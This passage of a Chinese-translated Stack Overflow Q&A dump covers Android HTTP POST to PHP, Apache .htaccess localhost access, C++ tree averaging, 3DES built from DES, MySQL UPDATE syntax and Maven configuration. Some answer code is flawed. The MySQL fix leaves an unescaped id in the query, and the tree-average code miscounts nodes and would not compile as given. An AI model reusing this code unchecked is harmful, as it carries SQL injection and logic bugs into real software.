                                            </DiscreteObjectKeyFrame.Value>
                                        </DiscreteObjectKeyFrame>
                                    </ObjectAnimationUsingKeyFrames>
                                </Storyboard>
                            </VisualState>
                        </VisualStateGroup>
                    </VisualStateManager.VisualStateGroups>
                    <Grid Margin="{StaticResource PhoneTouchTargetLargeOverhang}">
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="32"/>
                            <ColumnDefinition Width="*"/>
                        </Grid.ColumnDefinitions>
                        <Border x:Name="CheckBackground" BorderThickness="{StaticResource PhoneBorderThickness}" HorizontalAlignment="Left" Height="32" IsHitTestVisible="False" VerticalAlignment="Center" Width="32" Background="White" BorderBrush="White"/>
                        <Rectangle x:Name="IndeterminateMark" HorizontalAlignment="Center" Height="16" IsHitTestVisible="False" Grid.Row="0" Visibility="Collapsed" VerticalAlignment="Center" Width="16">
                            <Rectangle.Fill>
                                <SolidColorBrush Color="{StaticResource PhoneRadioCheckBoxCheckColor}"/>
                            </Rectangle.Fill>
                        </Rectangle>
                        <Path x:Name="CheckMark" Data="M0,119 L31,92 L119,185 L267,0 L300,24 L122,250 z" Fill="{StaticResource PhoneRadioCheckBoxCheckBrush}" HorizontalAlignment="Center" Height="18" IsHitTestVisible="False" Stretch="Fill" StrokeThickness="2" StrokeLineJoin="Round" Visibility="Collapsed" VerticalAlignment="Center" Width="24"/>
                        <ContentControl x:Name="ContentContainer" ContentTemplate="{TemplateBinding ContentTemplate}" Content="{TemplateBinding Content}" Grid.Column="1" HorizontalContentAlignment="{TemplateBinding HorizontalContentAlignment}" Margin="12,0,0,0" Padding="{TemplateBinding Padding}" VerticalContentAlignment="{TemplateBinding VerticalContentAlignment}" BorderBrush="White" Foreground="White"/>
                    </Grid>
                </Grid>
            </ControlTemplate>
        </Setter.Value>
    </Setter>
</Style> 
```

将此样式用于您的多选列表复选框

# php - Android 上的 HTTP POST

> ID：10246068
> 
> 赞同：3
> 
> 时间：2012-04-20T12:15:56.090
> 
> 标签：php, android, http-post

我想为 php 脚本创建一个简单的 HTTPRequest，并且我尝试制作最基本的应用程序以使功能正常工作。我想测试我的应用程序是否正在发送我提供给它的数据，因此我已将 android 应用程序发送到服务器，并且该服务器应该向我发送我已放入应用程序的数据。“postData”函数的代码是将数据从android发送到服务器，“default.php”的代码是网络服务器上接收的php文件，然后将数据转发到我的电子邮件地址（未给出）。这是代码

```
 public void postData() {

    // Create a new HttpClient and Post Header
    HttpClient httpclient = new DefaultHttpClient();
    HttpPost httppost = new HttpPost("http://somewhere.net/default.php");

    try {
        // Add your data
        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
        nameValuePairs.add(new BasicNameValuePair("thename", "Steve"));
        nameValuePairs.add(new BasicNameValuePair("theage", "24"));
        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

        // Execute HTTP Post Request
        //HttpResponse response = httpclient.execute(httppost);

        // Execute HTTP Post Request
        ResponseHandler<String> responseHandler=new BasicResponseHandler();
        String responseBody = httpclient.execute(httppost, responseHandler);

    //Just display the response back
    displayToastMessage(responseBody);

    } catch (ClientProtocolException e) {
        // TODO Auto-generated catch block
    } catch (IOException e) {
        // TODO Auto-generated catch block
    }
} 
```

以及“default.php”

```
<?php 
$thename=$_GET["thename"]; 
$theage=$_GET["theage"];

$to = "someemail@gmail.com";
$subject = "Android";
$body = "Hi,\n\nHow are you," . $thename . "?\n\nAt " . $theage . " you are getting old.";
if (mail($to, $subject, $body)) 
{
echo("<p>Message successfully sent!</p>");
} 
else 
{
echo("<p>Message delivery failed...</p>");
}
?> 
```

以下是 pastebin 中代码的链接： [postData()](http://pastebin.com/P3Wq3rw2)和[default.php](http://pastebin.com/MLiqP3PV)

我收到一封电子邮件，但是发送的“thename”和“theage”数据似乎是空的。收到的确切电子邮件是“嗨，你好吗？在你变老了。” 这向我表明服务器正在将名称和年龄发送为空。你们有没有人试过这个？我做错了什么？非常感谢您抽出时间阅读我的代码，并在可能的情况下回复我的问题。

编辑：我很白痴->“GETS”需要更改为“POST”。将其留在这里用于存档目的:)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-20T12:19:13.530

您正在使用`$_GET`而不是`$_POST`获取已发布数据的值。你要

```
<?php 
$thename=$_POST["thename"]; 
$theage=$_POST["theage"]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:20:37.627

您正在发送 POST 请求，但您的 php 脚本使用 GET 变量

尝试

```
 $thename=$_POST["thename"]; 
$theage=$_POST["theage"]; 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2015-01-26T08:39:36.617

Android 和 PHP 中使用的方法应该相同，要么`GET`要么`POST`.

在这种情况下，您可以将 PHP 更改为此 -

```
$thename = $_POST["thename"];
$theage = $_POST["theage"]; 
```

**或者**改变这个Android方面 -

```
HttpGet httppost = new HttpGet("http://somewhere.net/default.php"); 
```

# apache - Apache 限制访问，除非来自本地主机

> ID：10246074
> 
> 赞同：1
> 
> 时间：2012-04-20T12:16:24.757
> 
> 标签：apache, .htaccess, mod-access

下面的代码在`.htaccess`文件中`/home/cuddle/test/`

```
AuthUserFile "/home/cuddle/.htpasswds/test/passwd"
AuthType Basic
AuthName "Secure Area"
Require valid-user 
```

这很好用，它会提示输入用户名和密码，但是当我添加另一个规则以允许内部请求时：

```
Allow from 127.0.0.1
Satisfy Any 
```

它不再提示外部用户（非本地主机）输入密码，并且似乎让所有用户通过，无论他们是否验证或他们来自什么 IP。.htaccess 中没有其他权限/允许/拒绝

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-26T10:28:43.780

尝试这个：

```
AuthUserFile "/home/cuddle/.htpasswds/test/passwd"
AuthType Basic
AuthName "Secure Area"
Require valid-user
Order deny,allow
Deny from all
Allow from 127.0.0.1
Allow from ::1
Satisfy Any 
```

我刚刚注册了 StackOverflow，因为我偶然发现了同样的问题，经过反复试验，上面的配置对我有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-11-04T21:48:13.677

更简单的解决方案：

```
AuthUserFile "/home/cuddle/.htpasswds/test/passwd"
AuthType Basic
AuthName "Secure Area"
Require valid-user
Require local
Satisfy Any 
```

# c# - 企业库 SqlCacheDependency

> ID：10246075
> 
> 赞同：0
> 
> 时间：2012-04-20T12:16:26.853
> 
> 标签：c#, sql, caching, enterprise-library, sqlcachedependency

我在我的应用程序中使用 Enterprise Library Application Block 并且需要使用 SqlCacheDependency，但是缓存块没有 SqlDependency Expiration 可用，尝试搜索，发现链接断开的帖子（david hyden），必须有某种使用 sql 的方法里面的通知。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T14:16:51.690

我认为这是您引用的 David Hayden 链接的缓存版本：

[http://web.archive.org/web/20100115060028/http://davidhayden.com/blog/dave/archive/2006/04/30/2930.aspx](http://web.archive.org/web/20100115060028/http://davidhayden.com/blog/dave/archive/2006/04/30/2930.aspx)

这是来自 codeplex 的 ICacheItemExpiration 实现：[https ://entlib.codeplex.com/discussions/72118](https://entlib.codeplex.com/discussions/72118)

# c# - MVC3 中的 Windows 服务实现

> ID：10246076
> 
> 赞同：0
> 
> 时间：2012-04-20T12:16:38.017
> 
> 标签：c#, asp.net-mvc-3, windows-services

我正在开发一个 MVC3 应用程序。我想在日期过期时调用一个函数。我想为此使用 Windows 服务。谁能告诉我在 MVC3 应用程序中实现窗口服务的步骤？我也愿意在特定日期调用函数的任何其他选项。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T12:21:40.803

不可能。应用程序池在一段时间后死亡。创建一个 MVC3 应用程序和一个 Windows 服务。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-10T10:56:22.080

您可以使用控制台应用程序并使用窗口服务进行设置或通过任务管理器创建调度程序（crone）可能会对您有所帮助

如果您更多地描述您正在寻找的确切盟友，这对我们来说会更容易

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-27T19:12:17.907

您可以将 WCF 服务实现为 Windows 服务并在 Mvc3 应用程序层中创建回调，请查看此链接以创建双工服务

> > [http://msdn.microsoft.com/en-us/library/ms731064.aspx](http://msdn.microsoft.com/en-us/library/ms731064.aspx)

# c++ - 如何在二叉搜索树节点中查找次要元素的平均值

> ID：10246081
> 
> 赞同：1
> 
> 时间：2012-04-20T12:16:56.920
> 
> 标签：c++, data-structures, recursion, traversal, binary-search-tree

我正在尝试创建一个函数来查找树节点内某些数据的平均值。问题是，每个节点都包含两条数据，并且与其他 BST 不同，构建它的主要数据是一个字符串。在树中找到基于数字的元素的平均值对我来说不是问题，但是由于每个节点都包含一个字符串（一个人的名字）和一个看似随机的数字（这个人的权重），所以这棵树实际上是完整的混乱，我不知道如何处理它。这是我的节点，所以你明白我的意思：

```
struct Node {
    string name;
    double weight;
    Node* leftChild;
    Node* rightChild;
};
Node* root; 
```

这是其多个阶段之一的功能：

```
 // This isn't what I'm actually using so don't jump to conclusions
 double nameTree::averageWeight(double total, double total, int count) const
 {
     if (parent != NULL)
     {      //nonsense, nonsense
        averageWeight(parent->leftChild, total, count);
        averageWeight(parent->rightChild, total, count);
        count++;                                 
        total = total + parent->weight;      
        return total;
     }
     return (total / count);
} 
```

为了遍历这棵树，我尝试了一些递归，但是每次我设法对所有内容进行计数和总计时，都会出现一些问题，并且每次都会执行 return(total/count) 。我还尝试通过遍历树并将权重添加到数组来实现数组，但这不起作用，因为返回和递归受到干扰，或者其他什么。

就因为我知道有人会问，是的，这是为了学校作业。但是，这是一个类中的 18 个函数中的一个，所以我并不要求任何人为我做这件事。我已经使用这个功能几个小时了，我整晚都没有睡，我的大脑很痛，所以任何帮助都将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:41:15.150

您可以尝试以下方法：

```
 //total number of tree nodes
static int count=0;

 // Calculate the total sum of the weights in the tree 
double nameTree::calculateWeight(Node *parent)   
{   
    double total=0;

    if (parent != NULL)       
    {      
        //nonsense, nonsense    
        //Calculate total weight for left sub-tree
        total+=calculateWeight(parent->leftChild); 
        //Calculate weight for right sub-tree
        total+=calculateWeight(parent->rightChild);  
        //add current node weight
        total+=parent->weight;                                                       
    } 
    count++;   
    //if it is a leaf it will return 0
    return total;   
}  

double averageWeight()
{
    double weightSum;

    weightSum=calculateWeight();

    if(count!=0)
        return (weightSum/count);
    else
    {
        cout<<"The tree is empty";
        return 0;
    }
} 
```

我这里没有编译器，但我相信它可以工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:29:25.833

要计算平均值，您需要两个数字：总值和集合中元素的数量。您需要提供一个函数（递归可能是最简单的），它将遍历树并返回`pair<double,int>`带有这些值的 a 或修改作为引用传递的一些参数以存储这两个值。

在您的代码中，`averageWeight`返回 a `double`，但是当您递归调用它时，您会忽略（丢弃）结果。参数通过`count`副本传递，这意味着调用者将看不到递归调用中应用的修改（然后不知道`parent->weight`应该对结果*加权多少。*

这应该足以让你开始。

# c# - 将值传递给动态加载的 Web 用户控件

> ID：10246082
> 
> 赞同：3
> 
> 时间：2012-04-20T12:17:01.810
> 
> 标签：c#, asp.net, .net, user-controls

我有 ASPX 页面，在预初始化时我检查要加载的用户控件。

```
 control = "~/templates/" + which + "/master.ascx"; 
```

然后在页面加载时，我加载该控件

```
 Control userControl = Page.LoadControl(control);
 Page.Controls.Add(userControl); 
```

我如何将动态加载的用户控件从 aspx 传输到 ascx？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T13:10:26.070

您可以创建一个由所有自定义控件实现的界面。这样，您可以转换到该接口并使用它来传递您的数据。考虑这个例子：

```
public interface ICustomControl
{
    string SomeProperty { get; set; }
} 
```

...和您的控件：

```
public class Control1 : Control, ICustomControl
{
    public string SomeProperty
    {
        get { return someControl.Text; }
        set { someControl.Text = value; }
    }

    // ...
} 
```

现在，您可以执行以下操作：

```
Control userControl = Page.LoadControl(control);
Page.Controls.Add(userControl);

if (userControl is ICustomControl)
{
    ICustomControl customControl = userControl as ICustomControl;
    customControl.SomeProperty = "Hello, world!";
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:25:57.073

您可以使用 Page.Findcontrol(...) 在父页面中获取控件。

见：http: [//msdn.microsoft.com/en-us/library/31hxzsdw.aspx](http://msdn.microsoft.com/en-us/library/31hxzsdw.aspx)

只需确保您在代码中设置了 ID，以便您可以访问它。像：

```
Control userControl = Page.LoadControl(control);
userControl.ID = "ctlName";
Page.Controls.Add(userControl); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T12:28:06.890

在您的控件类类型中强制转换，您需要为控件创建公共属性（如果您想将数据传输到控件）

```
var userControl = (master)Page.LoadControl(control);

userControl.yourpublicproperty ="some text";

Page.Controls.Add(userControl); 
```

# encryption - 仅使用 DES 模拟 3DES EDE

> ID：10246083
> 
> 赞同：1
> 
> 时间：2012-04-20T12:17:05.433
> 
> 标签：encryption, encryption-symmetric, des, 3des

我的设备不支持完整的 3DES (EDE)。如何使用标准 DES 模拟一个？加密方式为CBC。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T12:25:58.900

您首先选择三个彼此不相关的独立 DES 密钥。

您需要将 DES 置于 ECB 模式，**而不是 CBC 模式**。您还需要确保每个加密和解密操作仅在 64 位块上完成，仅此而已。填充方案等将导致实现中的漏洞，并且将导致通过蛮力比对每个密钥的蛮力更快地发现块内容。

使用第一个密钥，加密您的明文。使用第二个密钥解密该值。使用第三个密钥加密完整块的值。它看起来像这样：

`Encrypt(k3, Decrypt(k2, Encrypt(k1, plaintext)))`

解密是另一种方式，看起来像这样：

`Decrypt(k1, Encrypt(k2, Decrypt(k3, ciphertext)))`

当您使用 3DES 加密您的块时，您需要应用您的操作模式，如 CBC 或 CTR，并在需要时应用填充。

当心。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T14:20:53.230

# 块模式加密

您所做的是将大小为 128 位（16 字节）或 168 位（24 字节）的密钥分别分成两块或三块。因此，对于 16 字节的密钥 K，您将有两个密钥 Ka 和 Kb，对于 24 字节的密钥，您将拥有 Ka、Kb 和 Kc。DES ABC 密钥的*有效*强度约为 112 位，DES ABA 密钥的*有效*强度约为 80 位。

要加密 8 字节的单个块（DES 和 3DES 的块大小），您将执行以下加密操作： Cn = E(Ka, D(Kb, E(Kc, Mn))) 其中 Mn 是 n'第 th 块纯文本消息和 Cn 的第 n 块密文。如果您没有 Kc，那么您可以使用 Ka（DES ABC 密钥与 DES ABA 密钥）。

为此，您需要单块 DES 加密，这与 ECB 模式下的单块加密相同，或者使用 CBC 和由 8 字节值 00h 组成的 IV 进行单块加密。

# 加拿大广播公司

这就是排序的块加密，现在你需要某种加密模式和填充模式。我将在这里解释CBC模式加密，ECB不应用于加密非随机数据。

使用 CBC 模式加密，您可以将向量异或到纯文本。该向量通常只是最后一个 DESede 加密块的输出。由于您没有任何前面的密文，因此您需要使用随机数据自己创建第一个向量。这个向量称为初始化向量或IV。请参阅[维基百科](http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation#Cipher-block%20chaining%20%28CBC%29)以获得清晰的图片。

# 填充

分组密码模式只允许对完整的纯文本块进行加密。所以你需要某种填充方案。虽然有很多填充模式，但大部分时间都使用 PKCS#5 填充。您应该像这样填充纯文本：使用值为 0Xh 的字节填充，其中 X 是创建完整块所需的填充字节数。X 应该在 1 到 8 之间：换句话说，始终使用 PKCS#5 填充；这使得从纯文本中区分填充字节成为可能。

如果您在在线协议中使用填充，那么您需要防止填充预言攻击。在这种情况下，强烈建议使用某种形式的完整性检查，例如使用单独的密钥在密文上添加 HMAC。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T12:21:50.727

[3DES](http://en.wikipedia.org/wiki/Triple_DES)只是 DES 在明文中使用了 3 次：

```
ciphertext = E_K3(D_K2(E_K1(plaintext)))
plaintext = D_K1(E_K2(D_K3(ciphertext)))

E_Kn = Encryption with Key number n.
D_Kn = Decryption with Key number n. 
```

因此，您可以仅使用 DES 轻松“模拟”3DES。

在 CBC 模式下，您需要一个 IV 开头，然后将下一个明文块与前一个密文块进行异或。如果您的设备不支持 CBC，那么这也很容易“模拟”。

# iphone - UIImageView 动画不保留最后一帧

> ID：10246085
> 
> 赞同：9
> 
> 时间：2012-04-20T12:17:12.767
> 
> 标签：iphone, objective-c

我正在使用这种方法来制作动画`UIImageView`：

```
 [imageView stopAnimating];
    imageView.animationImages = set;
    imageView.animationDuration = 0.4;
    imageView.animationRepeatCount = 1;
    [imageView startAnimating]; 
```

那套是`NSMutableArray`图像。我的问题是，当动画完成时， UIImageView 不会保留最后一帧`set`并带回动画之前在 imageview 中的图像。

我怎样才能使最后一帧成为imageview的图像？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-20T12:31:55.713

在开始动画之前，设置图像视图中的最后一张图像 imageView.image = yourLastImage; 然后开始动画。动画完成后，图像视图将显示 yourLastImage。

# php - 转义插入 Mysql 的字符串

> ID：10246086
> 
> 赞同：1
> 
> 时间：2012-04-20T12:17:22.407
> 
> 标签：php, mysql, escaping

我已经尝试了单引号、双引号等的所有组合，但以下代码不断出现 sql 语法错误。en 和 cy 是文本段落。我想我一定遗漏了一些明显的东西，但我看不到。有什么建议么？

```
$insert_dana = mysql_query("UPDATE Contributor (Summary_en,Summary_cy) VALUES ('" . mysql_real_escape_string($insert[en][0]) . "','" . mysql_real_escape_string($insert[cy][0]) . "') WHERE id='$insert[id]'"); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:21:24.560

你混合`insert`和`update`语句的语法。用这个

```
$insert_dana = mysql_query("UPDATE Contributor set Summary_en = '" . mysql_real_escape_string($insert[en][0]) . "', Summary_cy = '" . mysql_real_escape_string($insert[cy][0]) . "' WHERE id='$insert[id]'"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:22:12.420

您混淆[了 UPDATE-](http://dev.mysql.com/doc/refman/5.1/en/update.html)和[INSERT-](http://dev.mysql.com/doc/refman/5.1/en/insert-select.html)语法。对于`UPDATE`，就像：

```
UPDATE
  table
SET
  field = 'value'
WHERE
  ... 
```

虽然`INSERT`看起来像：

```
INSERT INTO
  table
  (field) 
VALUES
  ('value') 
```

你不能写一个`UPDATE`with `(field) VALUES ('value')`-syntax。

# c++ - 带有“const”参数重载的可变参数模板

> ID：10246094
> 
> 赞同：16
> 
> 时间：2012-04-20T12:17:42.930
> 
> 标签：c++, c++11, constants, variadic-templates

简化示例代码：

```
#include <iostream>

template<typename T>
void func(T &x)
{
    std::cout << "non-const " << x << std::endl;
}

template<typename T>
void func(const T &x)
{
    std::cout << "const " << x << std::endl;
}

template<typename ...ARGS>
void proxy(ARGS ...args)
{
    func(args...);
}

int main()
{
    int i = 3;

    func(i);
    func(5);
    func("blah");

    proxy(i);
    proxy(5);
    proxy("blah");
} 
```

预期输出：

```
non-const 3
const 5
const blah
non-const 3
const 5
const blah 
```

实际输出：

```
non-const 3
const 5
const blah
non-const 3
non-const 5
non-const blah 
```

因此`const`，当通过可变参数模板时，函数参数的限定符会以某种方式丢失。为什么？我怎样才能防止这种情况？

PS：使用 GCC 4.5.1 和[SUSE](http://en.wikipedia.org/wiki/SUSE_Linux_distributions) 11.4测试

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-04-20T12:30:54.203

您只是偶然发现了[转发问题](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2002/n1385.htm)。[使用完美转发](http://thbecker.net/articles/rvalue_references/section_07.html)解决了这个问题。

基本上，您需要通过 rvalue-reference 获取参数，并依靠[`std::forward`](http://en.cppreference.com/w/cpp/utility/forward)正确转发它们，同时保持它们的性质：

```
template<typename ...Args>
void proxy(Args&& ...args)  
{
    func(std::forward<Args>(args)...);
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-20T13:21:56.767

正如 Luc 已经提到的，这是一个转发问题，*如何防止它*的答案是使用*完美转发*。但我会在最后尝试解决其他问题：

> 因此，当通过可变参数模板时，函数参数的 const 限定符会以某种方式丢失。为什么？

这与类型推断有关。忽略您正在使用可变参数模板并考虑最简单的一个参数模板：

```
template <typename T>
void one_arg_proxy( T arg ) {
   func( arg );
} 
```

在您的通话地点`one_arg_proxy( 5 )`，即参数是`int` *rvalue*。类型推断开始确定类型`T`应该是什么，并且规则规定`T`是`int`，因此调用被转换为`one_arg_proxy<int>(5)`并且被编译的模板的实例化是：

```
template <>
void one_arg_proxy<int>( int arg ) {
   func( arg );
} 
```

现在调用 to`func`采用*左值*参数，因此`func`采用非常量引用的版本比采用 a 的版本更好（不需要转换）`const&`，从而产生您得到的结果。这里的问题是，`func`它不是用 to 的参数调用的`proxy`，而是用它的内部副本调用`proxy`的。

# ruby - Ruby：摘要代理身份验证

> ID：10246095
> 
> 赞同：0
> 
> 时间：2012-04-20T12:17:43.590
> 
> 标签：ruby, proxy, digest-authentication

我在代理后面（摘要身份验证）。

有没有办法访问网页？

1.  Httpclient - 基本和 NTLM
2.  Open-Uri - 没有摘要。

还有一件事。我想安装宝石。只有盒子里有 BASIC。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-21T16:30:39.623

没有答案。我找到了 HTTParty，但它不起作用。

基本身份验证有效（我使用嗅探器，它发送授权请求）：

```
require 'httparty'
require 'pp'

class Rep
  include HTTParty
  http_proxy '192.168.5.12', 3128
  basic_auth 'user', 'password'
end

pp Rep.get('http://ya.ru') 
```

但是摘要身份验证不起作用（嗅探器显示没有任何授权的请求）：

```
require 'httparty'
require 'pp'

class Rep
  include HTTParty
  http_proxy '192.168.5.12', 3128
  digest_auth 'user', 'password'
end

pp Rep.get('http://ya.ru') 
```

有错误吗？

# arrays - 将对象数组拆分为多个对象

> ID：10246100
> 
> 赞同：0
> 
> 时间：2012-04-20T12:17:52.560
> 
> 标签：arrays, powershell

我想拆分以下命令的输出：

```
PS C:\Windows\system32> $array = get-vm | Select-Object 
    @{Name="VMName";Expression=$_.name}},
    @{Name='VirtualNetwork';e={ $_.VirtualNetworkAdapters | Foreach-Object{
        $_.VirtualNetwork}}},
    @{Name='PhysicalMACAddress';e={$_.VirtualNetworkAdapters| Foreach-Object{
        $_.physicaladdress}}} 
```

谁的输出就像

![默认输出](../Images/dfa2149a973af562aec5d1d31b3913ee.png)

对于这样的输出，有人可以帮忙吗？

![所需输出](../Images/8f2e6bfecc77aa484537095e642f93e8.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-21T07:43:10.703

在我看来，你走错了方向。您必须首先获取所有对象，检查具有最多虚拟网络的对象，然后创建具有大量 VirtualNetworkN 属性的对象。

# maven - 如何阻止 maven-antrun-plugin 运行测试

> ID：10246101
> 
> 赞同：0
> 
> 时间：2012-04-20T12:17:55.693
> 
> 标签：maven, maven-antrun-plugin

编辑：解决了我在我的pom中配置了两次..

我正在 Maven 中设置生产配置文件。为了复制正确的 production.properties 文件并删除标准文件，我使用了 maven-antrun-plugin。

但我不想运行任何测试。并且由于某种原因，这个插件试图运行一些不工作的 canoo-web-tests（并且不应该工作，因为它们从未被使用过）。

关于如何让 antrun 插件只复制文件的任何想法？

这是antrun代码：

```
 <plugin>
                    <artifactId>maven-antrun-plugin</artifactId>
                    <executions>
                        <execution>
                            <phase>package</phase>
                            <goals>
                                <goal>run</goal>
                            </goals>
                            <configuration>
                                <tasks>
                                    <delete file="${project.build.outputDirectory}/properties/externalResources.properties"/>
                                    <delete file="${project.build.outputDirectory}/properties/externalResources.prod.properties"/>
                                    <copy file="src/main/resources/properties/externalResources.prod.properties"
                                          tofile="${project.build.outputDirectory}/properties/externalResources.properties"/>
                                </tasks>
                            </configuration>
                        </execution>
                    </executions>
                </plugin> 
```

这是显示它尝试进行一些测试的错误：

```
[INFO] Executing tasks
[delete] Deleting: C:\xxx\target\classes\properties\externalResources.properties
[delete] Deleting: C:\xxx\target\classes\properties\externalResources.prod.properties
[copy] Copying 1 file to C:\xxx\target\classes\properties
Trying to override old definition of task retry
[echo] Testing 'XXX-1.2.0' with
[echo]                                                                     locale 'no'
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------ 
```

然后是一个堆栈跟踪，显示它尝试读取 web-tests.xml，并且由于该文件有错误，因此构建失败。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-21T09:39:50.780

听起来您需要有可能使用单个模块基于不同配置创建不同的工件，这可以通过使用 Maven 的适当配置来实现。你可能会遇到这样的情况：

```
.
|-- pom.xml
`-- src
    |-- main
    |   |-- java
    |   |-- resources
    |   |-- environment
    |   |   |-- test
    |   |   |   `-- database.properties
    |   |   |-- qa
    |   |   |   `-- database.properties
    |   |   `-- production
    |   |       `-- database.properties
    |   `-- webapp 
```

这是一个 Web 应用程序的示例，但适用于 jar、ear 等任何工件。此外，您需要在 pom 中配置不同区域：

```
 <plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-assembly-plugin</artifactId>
    <executions>
      <execution>
        <id>test</id>
        <phase>package</phase>
        <goals>
          <goal>single</goal>
        </goals>
        <configuration>
          <descriptors>
            <descriptor>${project.basedir}/src/main/assembly/test.xml</descriptor>
          </descriptors>
        </configuration>
      </execution>
      <execution>
        <id>qa</id>
        <phase>package</phase>
        <goals>
          <goal>single</goal>
        </goals>
        <configuration>
          <descriptors>
            <descriptor>${project.basedir}/src/main/assembly/qa.xml</descriptor>
          </descriptors>
        </configuration>
      </execution>
      <execution>
        <id>production</id>
        <phase>package</phase>
        <goals>
          <goal>single</goal>
        </goals>
        <configuration>
          <descriptors>
            <descriptor>${project.basedir}/src/main/assembly/production.xml</descriptor>
          </descriptors>
        </configuration>
      </execution>
    </executions>
  </plugin> 
```

而每个描述符都包含适当的文件夹：

```
 <id>test</id>
  <formats>
    <format>war</format>
  </formats>
  <includeBaseDirectory>false</includeBaseDirectory>
  <dependencySets>
    <dependencySet>
      <unpack>true</unpack>
      <useProjectArtifact>true</useProjectArtifact>
    </dependencySet>
  </dependencySets>
  <fileSets>
    <fileSet>
      <outputDirectory>WEB-INF</outputDirectory>
      <directory>${basedir}/src/main/environment/test/</directory>
      <includes>
        <include>**</include>
      </includes>
    </fileSet>
  </fileSets>
</assembly> 
```

这将导致 maven mvn clean package 的简单运行，并将为每个环境生成不同的工件（带有分类器）。详细解释可以在[这里](http://blog.soebes.de/index.php?/archives/340-Maven-Configuration-For-Multipe-Environments.html)找到。

# codeigniter - 使用 Codeigniter 的登录系统

> ID：10246102
> 
> 赞同：7
> 
> 时间：2012-04-20T12:17:58.857
> 
> 标签：codeigniter, login

我是codeigniter的新手，但我对基础知识非常清楚。实际上，我是从我的新 Web 应用程序（CMS）开始的。

我想知道用于使用管理面板（后端）的 codeigniter 创建登录系统的最佳方法。

问候， Mrinal Purohit

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-21T07:55:54.070

如果您想了解可用于登录/注销的库，那么您应该阅读以下内容：

[我应该如何为 CodeIgniter 选择认证库？](https://stackoverflow.com/questions/346980/what-codeigniter-authentication-library-is-best)

如果你只是想了解一个安全且简单的登录过程，那么你应该去阅读这个的代码：

[https://github.com/DaBourz/SimpleLoginSecure](https://github.com/DaBourz/SimpleLoginSecure)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-13T21:05:47.080

我会推荐离子身份验证：[http ://benedmunds.com/ion_auth/](http://benedmunds.com/ion_auth/)

它有很好的文档，你可以有几种类型的用户，你可以很容易地拥有管理员组。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-21T08:33:51.360

您可以使用 tank_auth：[http](http://www.konyukhov.com/soft/tank_auth/) ://www.konyukhov.com/soft/tank_auth/ 非常好用！

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-13T19:05:44.337

这里是另一个库:) [http://ellislab.com/codeigniter/forums/viewthread/229645/](http://ellislab.com/codeigniter/forums/viewthread/229645/) 最好的问候。

# android - 如何获得纬度和经度小数点后的 13 个数字

> ID：10246108
> 
> 赞同：0
> 
> 时间：2012-04-20T12:18:37.623
> 
> 标签：android, google-maps, gps

我使用以下方法来获取当前的纬度和经度：

```
 locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (locationManager == null) {
                Toast.makeText(LocationsListActivity.this,
                        "Location Manager Not Available", Toast.LENGTH_SHORT)
                        .show();
            }
            location = locationManager
                    .getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null)
                location = locationManager
                        .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (location != null) {
                double lat = location.getLatitude();
                    double lng = location.getLongitude(); 
```

但问题是我得到的 lat 和 lng 小数点后只有 8 个数字（lat: 52.51491445, lng: 13.39044515） 我想要的是 lat 和 lng 我得到的小数点后有 13 个数字。

我怎样才能做到这一点？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:29:55.037

您可以查看 Criteria 的 setAccurary() 方法和 setPowerRequirement() 方法。

# java - 如何在 Vaadin 中制作加载开始栏

> ID：10246113
> 
> 赞同：1
> 
> 时间：2012-04-20T12:19:03.880
> 
> 标签：java, jakarta-ee, vaadin

嘿，知道如何在 vaadin 应用程序启动时制作进度条，以像 Flash 或 FLEX 的方式加载数据

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T20:23:40.827

您可以使用 vaadin 的[进度指示组件](http://demo.vaadin.com/sampler/#ProgressIndicators)。你会在[这里](https://vaadin.com/book/-/page/components.progressindicator.html)找到一个例子。

问题是，你如何计算你的数据加载进度？！

# python - Python：取消引用弱代理

> ID：10246116
> 
> 赞同：13
> 
> 时间：2012-04-20T12:19:08.773
> 
> 标签：python, weak-references

